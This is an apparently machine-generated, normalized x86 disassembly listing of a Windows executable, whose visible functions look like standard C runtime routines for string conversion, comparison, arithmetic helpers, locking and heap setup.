call sub_40c5c8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edi 0x7fffffff
cmp [ ebp + 0x10 ] edi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub ebx esi
push [ ebp + 0x10 ]
push esi
push ebx
call sub_4134c0
add esp 0xc
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub edi eax
mov eax edi
jmp r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp edi eax
je r-xdata
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_41314b
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_41314b
add esp 0x10
inc esi
dec [ ebp + 0x10 ]
je r-xdata
sub_412f48
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_412e66
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
mov eax 0x7fffffff
pop ebp
retn
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop ebp
jmp sub_4134c0
sub_412f9b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_40c61a
push 0x16
pop esi
mov [ eax ] esi
call sub_40c5c8
mov eax esi
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] ebx
mov [ esi ] bl
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_40c61a
push 0x16
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_40c61a
push 0x22
jmp r-xdata
pop edi
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
mov [ eax ] esi
call sub_40c5c8
mov eax esi
jmp r-xdata
mov edi ecx
xor ebx ebx
inc ebx
mov [ esi ] 0x2d
lea ecx [ esi + 0x1 ]
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
mov [ ecx ] dl
inc ecx
inc ebx
test eax eax
je r-xdata
mov [ ecx ] 0x0
dec ecx
mov [ esi ] 0x0
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ edi ] al
inc edi
cmp edi ecx
jb r-xdata
xor eax eax
sub_413055
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jns r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_412f9b
pop ebp
retn
sub_413080
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_41314b
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_40974b
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_40c61a
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_412ad7
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_40e67c
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_4099b9
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_413260
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_40974b
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
cmp [ ebp - 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
push ebx
mov bl [ esi ]
push edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x1c ]
push eax
movzx eax bl
push 0x8
push eax
call sub_40e67c
mov ecx [ ebp - 0x1c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov esi [ ecx + 0xc8 ]
mov [ ebp - 0x8 ] edx
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
lea ecx [ ebx - 0x61 ]
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov bl [ edi + 0x1 ]
add edi 0x2
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_40c61a
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
imul edx [ ebp + 0x14 ]
add edx ecx
mov [ ebp - 0x4 ] edx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
mov edx ecx
and edx 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
pop ebx
sub_41348b
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_413260
add esp 0x14
pop ebp
retn
sub_4134c0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_413530
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_413b8b
mov edi edi
push esi
push edi
call sub_408dc2
mov edi rw-data
mov ecx edi
lea esi [ eax + 0x20 ]
call sub_404ecc
push 0x0
push esi
mov ecx edi
mov [ rw-data ] r--data
call sub_404f18
push sub_413c73
call sub_407d41
pop ecx
pop edi
pop esi
retn
sub_401060
mov [ ecx ] r--data
jmp sub_406775
sub_4010a0
retn
j_sub_406775
jmp sub_406775
sub_401160
mov eax [ ecx ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
test eax eax
je r-xdata
retn
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
jmp eax
sub_401240
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_4067c5
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4013a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_4067c5
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_401510
mov eax [ ecx + 0x4 ]
push eax
call sub_406807
pop ecx
retn
sub_4019d8
mov eax r-xdata
retn
sub_4044c3
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_406c0a
sub_40452f
mov eax [ ecx + 0x4 ]
retn
sub_404533
mov eax [ ecx + 0x8 ]
retn
sub_404537
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_40454b
mov eax rw-data
retn
j_sub_406775#2
jmp sub_406775
sub_4045cb
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_4067c5
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_404618
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_4067c5
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_404665
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_4067c5
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
j_sub_407fd7
jmp sub_407fd7
sub_404746
mov [ ecx ] r--data
retn
sub_40474d
mov edi edi
push esi
mov esi ecx
call sub_405fb1
mov [ esi ] eax
call sub_405d70
mov ecx eax
call sub_4046df
mov eax esi
pop esi
retn
sub_404769
mov ecx [ ecx ]
test ecx ecx
je r-xdata
retn
call sub_404709
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_404807
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_406100
pop ecx
retn
sub_40484c
mov eax [ ecx + 0x14 ]
test eax eax
jle r-xdata
jns r-xdata
push [ ecx + 0x10 ]
call sub_408a41
pop ecx
retn
retn
push [ ecx + 0x10 ]
call sub_408a7b
pop ecx
sub_404869
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_405ade
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4048b0
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_40613e
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4048f7
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_404924
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x8
sub_4049d0
lea eax [ ecx + 0x8 ]
mov ecx [ eax - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_406100
pop ecx
retn
sub_404a44
mov edi edi
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
and [ esi ] 0x0
pop esi
retn
push eax
call sub_408a41
pop ecx
sub_404a86
add ecx 0x4
jmp sub_4062de
sub_404a8e
add ecx 0x4
jmp sub_4062e7
sub_404a96
or eax 0xffffffff
retn 0x4
sub_404a9c
xor eax eax
xor edx edx
retn
sub_404aa1
or eax 0xffffffff
retn
sub_404aa5
mov eax ecx
retn 0xc
sub_404aaa
retn 0x4
sub_405003
mov al 0x1
retn
sub_405006
xor eax eax
inc eax
retn
sub_405068
mov eax [ ecx + 0x54 ]
test eax eax
je r-xdata
retn
push eax
call sub_408e99
pop ecx
sub_405077
mov eax [ ecx + 0x54 ]
test eax eax
je r-xdata
retn
push eax
call sub_408f0c
pop ecx
sub_405141
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
push 0x3
mov [ eax ] ecx
pop eax
pop ebp
retn 0x10
sub_405155
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
cmp [ ebp + 0x14 ] eax
jae r-xdata
pop ebp
retn 0x10
mov eax [ ebp + 0x14 ]
sub_405ccd
mov eax [ ecx ]
cmp eax 0x4
jge r-xdata
retn
imul eax eax 0x18
add eax rw-data
push eax
call sub_406320
pop ecx
sub_405ce4
mov ecx [ ecx + 0x4 ]
call sub_404709
test eax eax
je r-xdata
retn
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_405d70
mov eax [ rw-data ]
retn
sub_406282
jmp r-xdata
cmp [ rw-data ] 0xa
jb r-xdata
mov eax [ rw-data ]
mov eax [ eax * 4 + rw-data ]
inc [ rw-data ]
push eax
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
retn
call eax
sub_4062c7
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_406300
push [ esi ]
call sub_406807
pop ecx
pop ecx
pop esi
retn
sub_4062de
push [ ecx ]
call sub_406310
pop ecx
retn
sub_4062e7
push [ ecx ]
call sub_406320
pop ecx
retn
sub_4062f0
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ InitializeCriticalSection@IAT ]
pop ebp
retn
sub_406300
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
pop ebp
retn
sub_406310
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_406320
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_406691
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_4066ae
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_4066fb
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_408a41
pop ecx
sub_406775
mov [ ecx ] r--data
jmp sub_4066fb
sub_4067ea
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_4067c5
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_406807
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_408a41
sub_406cd6
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_40af87
pop ecx
retn
sub_407114
call [ TlsAlloc@IAT ]
retn 0x4
sub_40711d
mov eax [ rw-data ]
retn
sub_407236
push 0xd
call sub_40b20d
pop ecx
retn
sub_40723f
push 0xc
call sub_40b20d
pop ecx
retn
sub_4073f5
push 0xd
call sub_40b20d
pop ecx
retn
sub_407401
push 0xc
call sub_40b20d
pop ecx
retn
sub_4075b0
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_407585
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_4075c8
push 0x8
call sub_40b2e6
pop ecx
retn
sub_4075d1
push 0x8
call sub_40b20d
pop ecx
retn
sub_4077f3
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_40b20d
pop ecx
sub_407808
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_4076c8
add esp 0xc
pop ebp
retn
sub_40781e
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_4076c8
add esp 0xc
pop ebp
retn
sub_407834
push 0x1
push 0x0
push 0x0
call sub_4076c8
add esp 0xc
retn
sub_407843
push 0x1
push 0x1
push 0x0
call sub_4076c8
add esp 0xc
retn
sub_4079bc
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_40bd36
pop ecx
pop ecx
retn
sub_4079d0
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_407843
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_40bec5
retn
push eax
call sub_40781e
_start
call sub_40d0b5
jmp sub_407899
sub_407a04
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push 0x19
call sub_40c852
push 0x1
push 0x0
call sub_40ad03
add esp 0xc
jmp sub_40acd0
call eax
sub_407b69
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_407b7d
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_407abb
jmp sub_407b69
sub_407d3b
call sub_4075d1
retn
sub_407d41
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_407d05
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_407d58
mov [ ecx ] r--data
jmp sub_406775
sub_407eb6
push [ ebp - 0x14 ]
call sub_407de9
pop ecx
retn
sub_407efa
call sub_4072c1
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_4072c1
dec [ eax + 0x90 ]
sub_407f9c
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_407fa5
mov esp [ ebp - 0x18 ]
call sub_40b088
sub_407fd7
call sub_4072c1
xor ecx ecx
cmp [ eax + 0x90 ] ecx
setne al
retn
sub_40805e
push 0x4
mov eax sub_413b36
call sub_407afd
call sub_4072c1
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_40b0c1
call sub_40b0d4
sub_408137
mov eax [ ebp - 0x14 ]
call sub_407f14
retn
sub_4083ae
xor eax eax
inc eax
retn
sub_4083b2
mov esp [ ebp - 0x18 ]
call sub_40b088
sub_408447
xor eax eax
inc eax
retn
sub_40844b
mov esp [ ebp - 0x18 ]
call sub_40b088
sub_40893e
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_4067c5
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_408a7b
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_406807
sub_408b72
push esi
call sub_408f0c
pop ecx
retn
sub_408c6e
push esi
call sub_408f0c
pop ecx
retn
sub_408db8
push [ ebp + 0xc ]
call sub_408f0c
pop ecx
retn
sub_408e79
call sub_409154
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_408a41
pop ecx
retn
call sub_40d651
sub_4090c9
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_408f48
pop ecx
pop ecx
retn
sub_4090f8
push 0x1
call sub_40b20d
pop ecx
retn
sub_40914a
push [ ebp + 0x8 ]
call sub_408f0c
pop ecx
retn
sub_409154
push 0x1
call sub_409027
pop ecx
retn
sub_409249
push [ ebp + 0x8 ]
call sub_408f0c
pop ecx
retn
sub_40948f
push [ ebp + 0x14 ]
call sub_408f0c
pop ecx
retn
sub_409605
push [ ebp + 0x8 ]
call sub_408f0c
pop ecx
retn
sub_409723
push esi
call sub_408f0c
pop ecx
retn
sub_4099ff
call sub_4072c1
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xc8 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_40b5d9
sub_409ecd
call sub_4072c1
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_40b5d9
sub_409ef3
call sub_4072c1
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
add eax 0xc
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_40b5d9
sub_40a01e
xor eax eax
retn
sub_40abfa
push 0xc
call sub_40b20d
pop ecx
retn
sub_40ac06
push 0xc
call sub_40b20d
pop ecx
retn
sub_40ac37
and [ esi + 0x70 ] 0xffffffef
retn
sub_40ae27
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_40af50
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40afee
push 0xe
call sub_40b20d
pop ecx
retn
sub_40b088
push 0x8
push r--data
call sub_40be80
call sub_4072c1
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_40acd0
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_40b0a8
xor eax eax
inc eax
retn
sub_40b0c1
call sub_4072c1
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_40b088
call eax
sub_40b0d4
push 0x8
push r--data
call sub_40be80
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
call sub_40b088
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_40b0f8
xor eax eax
inc eax
retn
sub_40b10c
push sub_40b088
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_40b20d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_40b2dd
push 0xa
call sub_40b20d
pop ecx
retn
sub_40b646
push 0xc
call sub_40b20d
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_40b910
push 0xd
call sub_40b20d
pop ecx
retn
sub_40bcdf
push 0xd
call sub_40b20d
pop ecx
retn
sub_40bd18
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_40bb7e
pop ecx
mov [ rw-data ] 0x1
sub_40bec5
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_40c06f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_40c0c4
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_40c238
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_40b20d
pop ecx
sub_40c274
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40c42f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40c43e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40c7fb
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_40ca7c
push sub_40ca3a
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_40d097
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_40d256
mov eax rw-data
retn
sub_40d25c
mov eax rw-data
retn
sub_40d34a
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
